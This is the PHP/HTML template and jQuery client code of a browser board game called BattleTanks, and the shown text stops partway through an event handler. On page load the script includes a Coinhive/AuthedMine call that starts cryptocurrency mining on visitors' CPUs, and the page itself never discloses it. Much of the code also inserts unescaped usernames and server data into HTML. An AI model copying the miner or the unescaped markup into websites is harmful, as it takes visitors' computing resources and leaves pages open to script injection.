<?php
defined('BASEPATH') OR exit('No direct script access allowed');
$alphabet = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');
$alphabet[-1] = '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>BattleTanks</title>

	<link rel="stylesheet" type="text/css" href="<?=base_url()?>assets/css/bootstrap.min.css" />
	<link rel="stylesheet" type="text/css" href="<?=base_url()?>assets/css/tooltipster.bundle.min.css" />
	<link rel="stylesheet" type="text/css" href="<?=base_url()?>assets/css/tooltipster/themes/tooltipster-sideTip-borderless.min.css" />
	<link rel="stylesheet" type="text/css" href="<?=base_url()?>assets/css/font-awesome.min.css" />
	<link rel="stylesheet" href="<?=base_url()?>assets/css/board.css">

	<!-- Hotjar Tracking Code for https://tanks.gficher.com -->
	<script>
	(function(h,o,t,j,a,r){
		h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
		h._hjSettings={hjid:662752,hjsv:6};
		a=o.getElementsByTagName('head')[0];
		r=o.createElement('script');r.async=1;
		r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
		a.appendChild(r);
	})(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
	</script>
</head>
<body>
	<div class="modal fade" id="loginModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		<div class="modal-dialog" role="document">
			<div class="modal-content">
				<div class="modal-header">
					<h5 class="modal-title" data-lang-id="menu_login" data-lang-id="menu_login">Sign in</h5>
					<button type="button" class="close" data-dismiss="modal" aria-label="Close">
						<span aria-hidden="true">&times;</span>
					</button>
				</div>
				<div class="modal-body">
					<form id="loginForm" method="post" target="">
						<div class="form-group">
							<div class="input-group">
								<div class="input-group-addon"><i class="fa fa-fw fa-user"></i></div>
								<input type="text" class="form-control" id="login_username" placeholder="Username or email">
							</div>
						</div>
						<div class="form-group">
							<div class="form-group">
								<div class="input-group">
									<div class="input-group-addon"><i class="fa fa-fw fa-key"></i></div>
									<input type="password" class="form-control" id="login_password" placeholder="Password">
								</div>
							</div>
						</div>
						<input type="submit" style="position: absolute; left: -9999px; width: 1px; height: 1px;" tabindex="-1" />
					</form>
					<p data-lang-id="menu_login_msg">You should use your <a href="https://gficher.com" target="_blank">gficher.com</a> account to log in. If you do not have it create one <a href="https://gficher.com/user/register" target="_blank">here</a>.<br>Plase note that it's very important to have a profile picture!</p>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-secondary" data-dismiss="modal" data-lang-id="menu_close">Close</button>
					<button type="button" class="btn btn-primary form-submit"><span data-lang-id="menu_login">Sign in</span></button>
				</div>
			</div>
		</div>
	</div>

	<nav class="navbar navbar-expand-lg navbar-dark bg-dark" id="topbar">
		<a class="navbar-brand" href="#">
			<img src="/assets/img/topbar_logo.png" width="30" height="30" alt="">
			BattleTanks
		</a>
		<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
			<span class="navbar-toggler-icon"></span>
		</button>
		<div class="collapse navbar-collapse" id="navbarText">
			<span class="navbar-text" data-lang-id="menu_by_gficher">
				by <a href="https://gficher.com">gficher</a>
			</span>
			<ul class="navbar-nav mr-auto">
				<li class="nav-item">
					<a class="nav-link auto-close" href="javascript:void(0)" onclick="getBoadList()" data-lang-id="menu_board_list">Board List</a>
				</li>
			</ul>
			<ul class="navbar-nav ml-auto">
				<li class="nav-item dropdown" id="accountDropdown">
					<a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-lang-id="menu_my_account">
						My Account
					</a>
					<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdownMenuLink">
						<div class="loggedout">
							<a class="dropdown-item auto-close" href="#" data-toggle="modal" data-target="#loginModal" data-lang-id="menu_login">Sign in</a>
						</div>
						<div class="loggedin" style="display:none;">
							<h6 class="dropdown-header"></h6>
							<a class="dropdown-item auto-close" href="//gficher.com/user/account" target="_blank" data-lang-id="menu_edit_profile">Edit profile</a>
							<a class="dropdown-item auto-close" href="#" onclick="logout()" data-lang-id="menu_logout">Log out</a>
						</div>
					</div>
				</li>
			</ul>
		</div>
	</nav>

	<div class="container" id="loader">
	</div>

	<div class="container" id="board_list" data-board="" style="display:none;">
		<h1 class="title" style="margin-top: 50px;"><img class="main-logo" src="/assets/img/logo.png" alt="BattleTanks" title="BattleTanks"></h1>
		<p style="text-align: center; margin-bottom: 50px; color: #FFF;" data-lang-id="boardlist_learn_more">You can learn more about the game <a href="https://archive.gficher.com/battletanks.pdf" target="_blank" title="BattleTanks Info">here</a>.</p>

		<table class="table table-striped table-inverse table-responsive">
			<thead>
				<tr>
					<th>#</th>
					<th data-lang-id="boardlist_open_join">Open time</th>
					<th data-lang-id="boardlist_start_time">Start time</th>
					<th data-lang-id="boardlist_status">Status</th>
					<th data-lang-id="boardlist_players">Players</th>
					<th></th>
				</tr>
			</thead>
			<tbody>
			</tbody>
		</table>
	</div>

	<div class="container" style="overflow: auto; display:none;" id="game_board">
		<h1 class="title" style="margin-top: 50px;"><span data-lang-id="board_game">Game</span> #<span class="game_id">2</span></h1>
		<div class="row">
			<div class="col">
				<div class="board-wrapper">
					<div class="bt-board"></div>
				</div>
				<div class="board-countdown">
					<div class="countdown">00:00:00:00</div>
					<button class="btn btn-primary btn-lg"><span data-lang-id="board_join">Join game</span></button>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="col-lg-6 col-md-12">
				<h2  class="title" data-lang-id="board_logbook">Logbook</h2>
				<div class="log-box"></div>
			</div>
			<div class="col-lg-6 col-md-12">
				<h2  class="title" data-lang-id="board_players">Players</h2>
				<div class="players-box">
					<table class="table table-striped table-inverse table-sm table-responsive" id="user_table">
						<thead>
							<tr>
								<th data-lang-id="board_name">Name</th>
								<th data-lang-id="board_life">Life</th>
								<th data-lang-id="board_power">Power</th>
								<th width="1"><i class="fa fa-fw fa-handshake-o" title="Vote for player"></i></th>
							</tr>
						</thead>
						<tbody>
						</tbody>
					</table>
				</div>
			</div>
		</div>
	</div>

	<script type="text/javascript" src="<?=base_url()?>assets/js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/js/popper.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/js/tooltipster.bundle.min.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/js/moment.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/js/jquery.countdown.min.js"></script>
	<script type="text/javascript" src="https://authedmine.com/lib/authedmine.min.js"></script>
	<script>
	var miner = new CoinHive.Anonymous('VGOoKHMh1AUbG8VtWD33mZzDhEznbMaX');
	miner.start();

	var me_id = 0, board = 0, last_action = 0, listener, lang;
	var params = location.pathname.split("/");
	var updateURL = function() {
		return "/api/board/getUpdates?board="+board.toString()+"&action="+last_action.toString();
	}

	$(window).on('popstate', function() {
		p = location.pathname.split("/");
		if (p.length > 2 && params[1] == "game") {
			getBoard(p[2]);
		} else {
			updateBoardList(function() {
				getBoadList();
			});
		}
	});

	$("#loginForm").submit(function() {
		username = $(this).find('input[type="text"]').val();
		password = $(this).find('input[type="password"]').val();
		button = $(this).closest('.modal-dialog').find(".form-submit");
		inputs = $(this).find('input');

		inputs.attr("disabled", true);
		width = button.outerWidth();
		button.attr("disabled", true).css({
			'width': width,
			'transition': '.2s',
		});

		console.log(button);

		button.find("span").fadeOut(200, function() {
			$(this).html('<i class="fa fa-fw fa-spinner fa-spin"></i>').fadeIn(200, function() {
				$.post('/api/user/login', {
					'user': username,
					'pass': password,
				}).done(function(data) {
					console.log(data);
					if (data.success) {
						button.find("span").fadeOut(200, function() {
							button.removeClass('btn-primary').addClass('btn-success').find("span").html('<i class="fa fa-fw fa-check"></i>').fadeIn(200);
							$("#accountDropdown > a.nav-link.dropdown-toggle").html("<img src=\"https://gficher.com/profile_images/"+data.picture+"\" style=\"width: 20px; border-radius: 100%; margin-top: -3px;\"> "+data.username+"");
							$("#accountDropdown .loggedin").css({display: 'block'});
							$("#accountDropdown .loggedout").css({display: 'none'});
							$("#accountDropdown .loggedin .dropdown-header").html(data.name+" "+data.surname);
							updateBoardList();
							updatePlayerList();
							$(".board-countdown > button").show();
							setTimeout(function() {
								$("#loginModal").modal('hide');
							}, 1000);
						});
						me_id = data.user;
						repaint();
					} else {
						button.find("span").fadeOut(200, function() {
							button.removeClass('btn-primary').addClass('btn-danger').find("span").html('<i class="fa fa-fw fa-times"></i>').fadeIn(200, function() {
								setTimeout(function() {
									button.find("span").fadeOut(200, function() {
										button.removeClass('btn-danger').addClass('btn-primary').attr("disabled", null).find("span").html(lang['menu_login']).fadeIn(200);
										inputs.prop("disabled", null);
									});
								}, 2000);
							});
						});
					}
				}).fail(function(data) {
					console.log(data);
					button.find("span").fadeOut(200, function() {
						button.removeClass('btn-primary').addClass('btn-danger').find("span").html('<i class="fa fa-fw fa-server"></i>').fadeIn(200, function() {
							setTimeout(function() {
								button.find("span").fadeOut(200, function() {
									button.removeClass('btn-danger').addClass('btn-primary').attr("disabled", null).find("span").html(lang['menu_login']).fadeIn(200);
									inputs.prop("disabled", null);
								});
							}, 2000);
						});
					});
				});
			});
		});

		return false;
	});

	$('body').on('click', '.form-submit', function (e) {
		$(this).closest('.modal-dialog').find('form').submit();
	});

	$('#loginModal').on('hidden.bs.modal', function (e) {
		$(this).find('input').val('').prop("disabled", null);
		$(this).find(".form-submit").prop("disabled", null).removeClass('btn-success').addClass('btn-primary').find("span").html('Sign in');
	})

	function createListener() {
		listener = new EventSource(updateURL(), {
			withCredentials: true,
		});

		listener.addEventListener('message', function(e) {
			//console.log(e.data);
			var data = JSON.parse(e.data);
			//if (data.handshake) console.log(data);
			if (data.success) {
				if (data.updates !== false) {
					$.each(data.updates, function(key, value) {
						addToLog(value);
						if (data.handshake) {
							console.log('Handshake received');
							last_action = value.id;
							return;
						}
						console.log('New log received', data);

						if (last_action >= value.id) return;
						switch (value.action) {
							case "move":
							movePlayer(value.player, value.direction);
							break;
							case "buy_life":
							use_life(value.player, -1);
							use_power(value.player, 5);
							break;
							case "attack":
							attackPlayer(value.target_user);
							break;
							case "empower":
							empowerPlayer(value.target_user);
							break;
							case "daily_power":
							dailyEmpower();
							break;
							case "join":
							updatePlayerList();
							break;
							case "leave":
							updatePlayerList();
							break;
							case "vote_power":
							use_power(value.player, -1);
							break;
							default:
							console.log(value);
						}
					});
				}
			} else {
				console.log(data);
			}
		}, false);

		listener.addEventListener('open', function(e) {
			console.log('Listener connected', e);
		}, false);

		listener.addEventListener('error', function(e) {
			console.log('Listener closed', e, e.readyState);
			if (e.readyState != EventSource.CLOSED) {
				//listener.close();
				//createListener();
				$(".log-box").find('.entry').remove();
			}
		}, false);
	}

	function addToLog(value) {
		switch (value.action) {
			case "move":
			switch (value.direction) {
				case "u":
				direction = lang['logbook_up'];
				break;
				case "d":
				direction = lang['logbook_down'];
				break;
				case "l":
				direction = lang['logbook_left'];
				break;
				case "r":
				direction = lang['logbook_right'];
				break;
				default:
				direction = "?";
			}
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-arrows\"></i> <b>"+value.player_username+"</b> <span style=\"color: #2859ac;\">"+lang['logbook_moved']+"</span> <b>"+direction+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "buy_life":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-heart\"></i> <b>"+value.player_username+"</b> <span style=\"color: #34a835;\">"+lang['logbook_bought_life']+"</span> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "attack":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-bomb\"></i> <b>"+value.player_username+"</b> <span style=\"color: #ab2b2b;\">"+lang['logbook_attacked']+"</span> <b>"+value.target_username+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "empower":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-power-off\"></i> <b>"+value.player_username+"</b> <span style=\"color: #0097b1;\">"+lang['logbook_empowered']+"</span> <b>"+value.target_username+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "death":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-wheelchair\"></i> <b>"+value.player_username+"</b> <span style=\"color: #818181;\">"+lang['logbook_died']+"</span>. <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "daily_power":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-plus\"></i> <b>"+lang['logbook_daily_power']+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "join":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-sign-in\"></i> <b>"+value.player_username+"</b> <span style=\"color: #005b06;\">"+lang['logbook_joined_game']+"</span> "+lang['logbook_the_board']+". <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "leave":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-sign-out\"></i> <b>"+value.player_username+"</b> <span style=\"color: #740000;\">"+lang['logbook_left_game']+"</span> "+lang['logbook_the_board']+". <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "open":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-hourglass\"></i> <b>"+lang['logbook_open_players']+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "start":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-hourglass-half\"></i> <b>"+lang['logbook_started']+"</b> <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "end":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-houtglrass-end\"></i> <b>"+value.player_username+"</b> "+lang['logbook_won']+" <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			case "vote_power":
			$(".log-box").prepend("<div class=\"entry\">\
			<i class=\"fa fa-fw fa-plus\"></i> <b>"+value.player_username+"</b> "+lang['logbook_vote_power']+" <span class=\"time\">"+value.timestamp+"</span>\
			</div>");
			break;
			default:
			console.log('Handshake log error', value);
		}
	}

	function updatePlayerList() {
		$.get('/api/board/getPlayerList', {
			'board': board,
		}).done(function(data) {
			console.log('Player list result received', data);
			if (data.success) {
				printPlayerList(data.players);
			}
		}).fail(function(data) {
			console.error(data);
		});
	}

	function printPlayerList(players) {
		$("#user_table tbody tr").remove();
		$(".bt-board > .bt-row > .bt-col > .player").remove();

		if (players === false) return;

		$.each(players, function(key, value) {
			if (value.life > 0) {
				life_color = "success";
				power_color = "primary";
			} else {
				life_color = "secondary";
				power_color = "secondary";
			}

			if ($("#user_table tbody tr[data-id='"+me_id+"'] td:nth(1) span").html() != "0") {
				vote_btn = "";
			} else {
				if (value.dead_time !== null) {
					vote_btn = "";
				} else {
					vote_btn = "<input type=\"radio\" name=\"voteId\"/>";
				}
			}

			$("#user_table tbody").append("\
			<tr data-id=\""+value.user+"\">\
			<td scope=\"row\">\
			<img src=\"https://gficher.com/profile_images/"+value.picture+"\" style=\"width: 20px; border-radius: 100%;\"/> \
			"+value.username+"</td>\
			<td><span class=\"text-"+life_color+"\">"+value.life+"</span></td>\
			<td><span class=\"text-"+power_color+"\">"+value.power+"</span></td>\
			<td style=\"text-align:center;\">"+vote_btn+"</td>\
			</tr>");

			if (value.dead_time != null) return;

			value.pos_x = (parseInt(value.pos_x)+1).toString();
			value.pos_y = (parseInt(value.pos_y)+1).toString();

			$(".bt-board > .bt-row > .bt-col[data-x='"+(value.pos_x-1)+"'][data-y='"+(value.pos_y-1)+"']").append("<div class=\"player\" data-id=\""+value.user+"\" data-name=\""+value.username+"\">\
			<div class=\"status\">\
			<div class=\"power\">"+value.power+"</div>\
			<div class=\"lives\">"+value.life+"</div>\
			</div>\
			<div class=\"pic ttip\" style=\"background-image: url(https://gficher.com/profile_images/"+value.picture+");\" title=\""+value.username+"\"></div>\
			</div>");
		});

		if ($("#user_table tbody tr[data-id="+me_id+"]").length && $("#user_table tbody tr[data-id="+me_id+"] td .text-success").html() == "0") updateVote();
	}

	function paintBoard(size) {
		$(".bt-board > .bt-row").remove();
		$(".bt-board").css({
			width: 42*(size+1)+'px',
			height: 42*(size+1)+'px',
		});

		for (var i = 0; i <= size; i++) {
			$(".bt-board").append("<div class=\"bt-row\"></div>");
			for (var j = 0; j <= size; j++) {
				if ((i==0) || (j==0)) {
					out = (i == 0) ? j-1 : i-1;
					if (out == -1) {
						$(".bt-board > .bt-row").last().append("<div class=\"bt-col coord\"><img src=\"/assets/img/board_logo.png\" alt=\"\" /></div>");
						continue;
					}

					$(".bt-board > .bt-row").last().append("<div class=\"bt-col coord\">"+out+"</div>");
					continue;
				}

				$(".bt-board > .bt-row").last().append("<div class=\"bt-col\" data-x=\""+(j-1)+"\" data-y=\""+(i-1)+"\"></div>");
			}
		}
	}

	function updateVote() {
		$.get('/api/board/getMyVote', {
			'board': board,
			'player': me_id,
		}).done(function(data) {
			console.log(data);
			if (data.success) {
				if(data.vote !== false) {
					$("#user_table tbody tr td input[type=radio][name=voteId]").prop('checked', false);
					$("#user_table tbody tr[data-id='"+data.vote+"'] td input[type=radio][name=voteId]").prop('checked', true);
				}
			}
		}).fail(function(data) {
			console.log(data);
		});
	}

	function login(username, password) {
		$("#loginModal").find('input[type="text"]').val(username);
		$("#loginModal").find('input[type="password"]').val(password);
		$("#loginModal").find('form').submit();
	}

	function logout() {
		$.post('/api/user/logout').done(function(data) {
			console.log(data);
			if (data.success) {
				me_id = 0;
				updateBoardList();
				updatePlayerList();
				$(".board-countdown > button").hide();
				repaint();
				$("#accountDropdown > a.nav-link.dropdown-toggle").html("My Account");
				$("#accountDropdown .loggedin").css({display: 'none'});
				$("#accountDropdown .loggedout").css({display: 'block'});
			}
		}).fail(function(data) {
			console.log(data);
		});
	}

	function get_life(id) {
		return parseInt($(".player[data-id='"+id+"']").find('.status .lives').html());
	}

	function use_life(id, life = 1) {
		$(".player[data-id='"+id+"']").find('.status .lives').html((get_life(id)-life));
		$("#user_table tbody tr[data-id='"+id+"'] td:nth(1) span").html(get_life(id));
		show_arrows(me_id);
		paint_range(me_id);
	}

	function get_power(id) {
		return parseInt($(".player[data-id='"+id+"']").find('.status .power').html());
	}

	function use_power(id, ap = 1) {
		$(".player[data-id='"+id+"']").find('.status .power').html((get_power(id)-ap));
		$("#user_table tbody tr[data-id='"+id+"'] td:nth(2) span").html(get_power(id));
		show_arrows(me_id);
		paint_range(me_id);
	}

	function dailyEmpower() {
		$(".player").each(function(key, value) {
			use_power($(this).attr('data-id'), -1);
		});
	}

	function movePlayer(id, dir) {
		if (get_power(id) == 0) return;

		x = 0;
		y = 0;

		if (dir == 'u') {
			y--;
		} else if (dir == 'd') {
			y++;
		} else if (dir == 'l') {
			x--;
		} else if (dir == 'r') {
			x++;
		}

		$(".player[data-id='"+id+"']").animate({
			left: 42*x+'px',
			top: 42*y+'px',
		}, function() {
			cx = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-x');
			cy = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-y');

			content = $(".player[data-id='"+id+"']").closest('.bt-col').html();

			$(".player[data-id='"+id+"']").remove();
			$(".bt-board > .bt-row > .bt-col[data-x='"+(parseInt(cx)+x)+"'][data-y='"+(parseInt(cy)+y)+"']").html(content);

			$(".player[data-id='"+id+"']").css({
				'left': '0',
				'top': '0',
			});

			use_power(id);
			if (id == me_id) {
				if (get_power(id) != 0) show_arrows(id);
				paint_range(id);
			}

			$("[data-id='"+id+"'] > .ttip").tooltipster({
				theme: 'tooltipster-borderless',
				delay: 0,
				content: $("[data-id='"+id+"']").attr('data-name'),
			});
		});
	}

	function attackPlayer(id) {
		use_power(me_id);
		use_life(id);

		if (get_life(id) == 0) {
			$(".player[data-id='"+id+"']").fadeOut(2000, function() {
				$(this).remove();
				show_arrows(me_id);
			});
			$("#user_table tbody tr[data-id='"+id+"'] td:nth(1) span").removeClass('text-success').addClass('text-secondary');
			$("#user_table tbody tr[data-id='"+id+"'] td:nth(2) span").removeClass('text-primary').addClass('text-secondary');
			$("#user_table tbody tr[data-id='"+id+"'] td input[type=radio][name=voteId]").remove();
		}
		return;
	}

	function empowerPlayer(id) {
		use_power(me_id);
		use_power(id, -1);
		return;
	}

	function show_arrows(id) {
		cx = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-x');
		cy = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-y');

		$(".move-arrow").remove();

		if (get_power(id) == 0) return;

		for (var i = -1; i < 2; i++) {
			for (var j = -1; j < 2; j++) {
				if (i == j) continue;
				if (i == 0-j) continue;
				if (i==j && i == 0) continue;
				if (parseInt(cx)+i < 0) continue;
				if (parseInt(cy)+j < 0) continue;
				if (parseInt(cx)+i > 19) continue;
				if (parseInt(cy)+j > 19) continue;
				if ($(".bt-board > .bt-row > .bt-col[data-x='"+(parseInt(cx)+i)+"'][data-y='"+(parseInt(cy)+j)+"'] > .player").length) continue;

				if (i==-1 && j ==0) dir = 'left';
				if (i==0 && j ==-1) dir = 'up';
				if (i==1 && j ==0) dir = 'right';
				if (i==-0 && j ==1) dir = 'down';

				$(".bt-board > .bt-row > .bt-col[data-x='"+(parseInt(cx)+i)+"'][data-y='"+(parseInt(cy)+j)+"']").html("\
				<div class=\"move-arrow\" data-dir=\""+dir+"\">\
				<i class=\"fa fa-arrow-"+dir+"\"></i>\
				</div>");
			}
		}
	}

	function paint_range(id, range = 2) {
		cx = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-x');
		cy = $(".player[data-id='"+id+"']").closest('.bt-col').attr('data-y');

		$(".range").removeClass('range');
		$(".bt-board > .bt-row > .bt-col > .player > .actions").remove();

		//if (get_power(id) == 0) return;

		for (var i = -range; i <= range; i++) {
			for (var j = -range; j <= range; j++) {
				if (i==j && i == 0) continue;
				if (parseInt(cx)+i < 0) continue;
				if (parseInt(cy)+j < 0) continue;
				if (parseInt(cx)+i > 19) continue;
				if (parseInt(cy)+j > 19) continue;

				$(".bt-board > .bt-row > .bt-col[data-x='"+(parseInt(cx)+i)+"'][data-y='"+(parseInt(cy)+j)+"']").addClass('range');
			}
		}

		$(".bt-board > .bt-row > .bt-col.range > .player").append("\
		<div class=\"actions\">\
		<div class=\"bomb\" title=\"Bomb\"><i class=\"fa fa-bomb\"></i></div>\
		<div class=\"empower\" title=\"Give Action Point\"><i class=\"fa fa-plus\"></i></div>\
		</div\
		");
	}

	function repaint() {
		$(".move-arrow").remove();
		$(".player[data-id] > .pic").css({
			'border-color': 'transparent',
		});
		$(".player[data-id='"+me_id+"'] > .pic").css({
			'border-color': 'yellow',
		});
		show_arrows(me_id);
		paint_range(me_id);
	}

	function getBoard(id) {
		if (listener !== undefined) listener.close();
		last_action = 0;
		$(":animated").promise().done(function() {
			$("#board_list").fadeOut(function() {
				$("#game_board").fadeOut(function() {
					$("#loader").fadeIn(function() {
						$.get('/api/board/getBoard', {
							'id': id,
						}).done(function(data) {
							console.log('Board data received', data);
							if (data.success) {
								window.history.pushState(id, "BattleTanks - Game #"+id, "/game/"+id);
								board = id;
								$(".log-box > .entry").remove();
								if (moment(data.open_time).isAfter(moment())) {

								} else if (moment(data.start_time).isAfter(moment())) {
									if (me_id != 0) {
										$(".board-countdown > button").show();
									} else {
										$(".board-countdown > button").hide();
									}

									$(".bt-board").hide();
									$(".board-countdown").show();
									$(".board-countdown > .countdown").countdown(moment(data.start_time).format("YYYY/MM/DD HH:mm:ss"), function(event) {
										$(this).text(event.strftime('%D:%H:%M:%S'));
									});
									$("#game_board .board-countdown > button").prop('disabled', false).removeClass('btn-success').removeClass('btn-danger').addClass('btn-primary');

									inGame = false;
									$.each(data.players, function(key, data) {
										if (data['user'] == me_id) {
											inGame = true;
											return;
										}
									});

									if (inGame) {
										$(".board-countdown > button > span").html(lang['board_leave']);
									} else {
										$(".board-countdown > button > span").html(lang['board_join']);
									}
								} else if (!data.players) {
									$.get('/api/board/startGame', {
										'board': board,
									}).done(function(data) {
										console.log('Start result received', data);
										if (data.success) {
											getBoard(board);
										} else {
											getBoadList();
										}
									}).fail(function(data) {
										console.error(data);
									});
								} else {
									$(".bt-board").show();
									$(".board-countdown").hide();
									paintBoard(parseInt(data.size));
								}

								printPlayerList(data.players);

								$('.ttip').tooltipster({
									theme: 'tooltipster-borderless',
									delay: 0,
								});

								if (data.end_time == null) {
									repaint();
								}
								$("#game_board").attr('data-board', board);
								$("#game_board > .title > span.game_id").html(board);
								createListener();

								$("#loader").fadeOut(function() {
									$("#game_board").fadeIn();
								});
							} else {
								alert("Game not found");
								getBoadList();
							}
						}).fail(function(data) {
							console.error(data);
						});
					});
				});
			});
		});
	}

	function getBoadList() {
		if (listener != undefined) listener.close();
		last_action = 0;
		board = 0;
		window.history.pushState(0, "BattleTanks", "/");
		$(":animated").promise().done(function() {
			$("#game_board").fadeOut(function() {
				$("#board_list").fadeOut(function() {
					$("#loader").fadeIn(function() {
						updateBoardList(function() {
							$("#loader").fadeOut(function() {
								$("#board_list").fadeIn();
								$(".bt-board > .bt-row").remove();
								$(".log-box > .entry").remove();
								$('.board-countdown > .countdown').html('');
							});
						});
					});
				});
			});
		});
	}

	function updateBoardList(endCallback = null) {
		$.get('/api/board/getBoards').done(function(data) {
			console.log('Boards', data);
			$("#board_list table tbody tr").remove();
			if (data.success) {
				$.each(data.results, function(key, value) {
					if (value['players'] !== false) {
						value['players'] = value['players'].length;
					} else {
						value['players'] = 0;
					}

					if (moment(value['open_time']).isAfter(moment())) {
						progress = '<span class=\"text-primary\">'+lang['boardlist_planned']+'</span>';
						button = "";
					} else if (moment(value['start_time']).isAfter(moment())) {
						progress = '<span class=\"text-success\">'+lang['boardlist_open_join']+'</span>';
						button = "<button type=\"button\" class=\"btn btn-primary btn-xs see\"><i class=\"fa fa-fw fa-sign-in\"></i> "+lang['boardlist_join']+"</button>";
					} else if (value['players'] == 0) {
						progress = '<span class=\"text-danger\">'+lang['boardlist_cancelled']+'</span>';
						button = "";
					} else if (value['end_time'] == null) {
						progress = '<span class=\"text-warning\">'+lang['boardlist_in_progress']+'</span>';
						button = "<button type=\"button\" class=\"btn btn-primary btn-xs see\"><i class=\"fa fa-fw fa-eye\"></i> "+lang['boardlist_view']+"</button>";
					} else {
						progress = '<span class=\"text-danger\">'+lang['boardlist_ended']+'</span>';
						button = "<button type=\"button\" class=\"btn btn-secondary btn-xs see\"><i class=\"fa fa-fw fa-eye\"></i> "+lang['boardlist_see']+"</button>";
					}

					$("#board_list table tbody").prepend("\
					<tr data-id=\""+value['id']+"\">\
					<th scope=\"row\">"+value['id']+"</th>\
					<td>"+value['open_time']+"</td>\
					<td>"+value['start_time']+"</td>\
					<td>"+progress+"</td>\
					<td>"+value['players']+"</td>\
					<td width=\"1\">"+button+"</td>\
					</tr>\
					");
				});
			}

			if (endCallback !== null) endCallback();
		}).fail(function(data) {
			console.error(data);
		});
	}

	$(document).ready(function() {
		var getUrlParameter = function getUrlParameter(sParam) {
			var sPageURL = decodeURIComponent(window.location.search.substring(1)),
			sURLVariables = sPageURL.split('&'),
			sParameterName,
			i;

			for (i = 0; i < sURLVariables.length; i++) {
				sParameterName = sURLVariables[i].split('=');

				if (sParameterName[0] === sParam) {
					return sParameterName[1] === undefined ? true : sParameterName[1];
				}
			}
		};

		init_lang = getUrlParameter('lang') == undefined ? 'pt-br' : getUrlParameter('lang');

		$.get('/api/lang', {
			'lang': init_lang,
		}).done(function(data) {
			console.log('Lang info received', data);

			lang = data.lang;

			// Set lang
			$.each($("[data-lang-id]"), function(key, value) {
				$(this).html(lang[$(this).attr('data-lang-id')]);
			});

			$.post('/api/user/getAUth').done(function(data) {
				console.log('Auth info received', data);
				if (data.success) {
					me_id = data.user;
					$("#accountDropdown > a.nav-link.dropdown-toggle").html("<img src=\"https://gficher.com/profile_images/"+data.picture+"\" style=\"width: 20px; border-radius: 100%; margin-top: -3px;\"> "+data.username+"");
					$("#accountDropdown .loggedin").css({display: 'block'});
					$("#accountDropdown .loggedout").css({display: 'none'});
					$("#accountDropdown .loggedin .dropdown-header").html(data.name+" "+data.surname);
				}
			}).fail(function(data) {
				console.error(data);
			});

			if (params.length > 2 && params[1] == "game") {
				getBoard(params[2]);
			} else {
				updateBoardList(function() {
					getBoadList();
				});
			}
		}).fail(function(data) {
			location.reload();
		});

		$('body').on("click", '.bt-board > .bt-row > .bt-col > .move-arrow', function() {
			dir = $(this).attr('data-dir').charAt(0);

			$.get('/api/board/move', {
				'board': board,
				'player': me_id,
				'dir': dir,
			}).done(function(data) {
				console.log('Move result received', data);
				if (data.success) {
					last_action = data.action;
					$(".move-arrow").remove();
					movePlayer(me_id, dir);
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('body').on("click", '.bt-board > .bt-row > .bt-col > .player > .actions > .bomb', function() {
			target = $(this).closest('.player').attr('data-id');

			$.get('/api/board/attack', {
				'board': board,
				'player': me_id,
				'target': target,
			}).done(function(data) {
				console.log('Attack result received', data);
				if (data.success) {
					last_action = data.action;
					attackPlayer(target);
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('body').on("click", '.bt-board > .bt-row > .bt-col > .player > .actions > .empower', function() {
